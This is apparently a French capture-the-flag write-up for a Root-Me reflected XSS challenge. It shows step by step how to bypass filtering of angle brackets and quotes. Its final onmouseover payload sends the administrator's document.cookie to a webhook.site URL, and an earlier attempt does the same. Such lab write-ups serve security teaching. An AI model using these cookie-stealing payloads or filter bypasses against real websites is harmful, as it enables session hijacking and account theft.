# Writeup -- XSS - Volatile

## Catégorie

Web - Client

## Énoncé

Récupérer le cookie de l'administrateur

## Choses à savoir 

XSS Reflected : Ce sont les injections XSS dans les URL.

On peut éviter les filtres mis en place par le site, par exemple, on peut remplacer les quotes par ' ou `

## Exploitation

En arrivant sur le site fait pour le challenge, on remarque que la navigation entre les pages se fait avec un paramètre `p="page"`

On peut donc essayer d'injecter du code JS dans l'URL :
```
http://challenge01.root-me.org/web-client/ch26/?p=%3Cscript%3Ealert(1)%3C/script%3E
```
<img width="902" height="571" alt="image" src="https://github.com/user-attachments/assets/31cde36e-2e61-447d-9103-269b9b8e26a5" />

Ceci n'affiche aucune alerte. En Revanche, on remarque plusieurs choses :

- La page recherchée est écrite dans le HTML
- On peut faire un report à l'administrateur

Avec ces deux informations, on sait que la vulnérabilité va se trouver ici. Cependant, en regardant dans le code source de la page :

<img width="1096" height="257" alt="image" src="https://github.com/user-attachments/assets/5e46b017-0cce-4156-8118-c6db1fb1d05d" />

On remarque que les `<` et `>` sont filtrées. 

De même avec les quotes, avec un autre payload :
```
http://challenge01.root-me.org/web-client/ch26/?p=%27%20onmouseover=%22document.location=%27https://webhook.site/5d26dafb-625e-4b04-a768-73dfb20eb89d?c=%27+document.cookie%22
```
<img width="943" height="134" alt="image" src="https://github.com/user-attachments/assets/7ddca8b6-4be7-4666-b2b7-e2f5d1c20626" />

On doit donc éviter d'ajouter des quotes ainsi que des <> dans le payload.

On peut continuer avec le onmouseover, car il ne demande pas de <>, mais il faut trouver un moyen de remplacer les quotes.

Premièrement, on remarque que l'apostrophe n'a pas été filtré dans le dernier payload.

On peut donc l'utiliser à la place des quotes, mais il faut trouver un moyen de remplacer les apostrophes pour le lien webhook.

Pour javascript, il existe le caractère ` qui permet d'entourer des chaines de caractères. On peut donc les utiliser ici.

Payload final :
```
 ' onmouseover=' document.location=`https://webhook.site/2f1ce09f-e12d-4fad-8fa8-ca1af01da4cd?c=`.concat(document.cookie)'
```

On entre ce payload dans le paramètre de page, et on report à l'administrateur. En regardant les requêtes sur notre webhook, on retrouve le flag :

<img width="675" height="318" alt="flag" src="https://github.com/user-attachments/assets/b58472c2-cf90-4930-ab59-3921361998e4" />
